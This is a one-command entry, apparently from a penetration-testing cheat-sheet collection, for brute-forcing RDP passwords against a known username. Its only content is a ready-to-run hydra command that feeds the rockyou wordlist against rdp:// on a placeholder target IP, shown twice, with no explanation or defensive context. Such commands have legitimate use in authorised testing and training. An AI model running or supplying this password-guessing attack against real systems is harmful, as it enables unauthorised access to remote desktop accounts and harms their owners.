---
id: 23356559-7b7f-4397-a646-82ba319bcd5a
name: Bruteforce passwords for RDP, knowing the username
type: command
executor: bash
data: 'hydra -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip

  '
output: null
created_at: '2020-07-14T18:14:45.643506+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Bruteforce passwords for RDP, knowing the username

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip

```
